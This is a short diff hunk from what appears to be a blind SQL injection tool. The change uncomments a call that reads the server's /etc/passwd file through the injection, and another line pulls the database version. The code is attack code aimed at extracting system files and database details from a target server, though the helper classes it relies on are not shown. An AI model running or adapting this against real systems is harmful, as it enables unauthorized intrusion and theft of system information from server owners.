@@ -16,7 +16,7 @@ tester = BlindTester(
 sf = BlindStringFinder(tester)
 
 # sf.read_string("(SELECT {})".format(SqliEncoder.str_to_hexa('coucou')))
-# print(sf.read_file('/etc/passwd'))
+print(sf.read_file('/etc/passwd'))
 
 print(sf.read_string("(SELECT version())"))
 
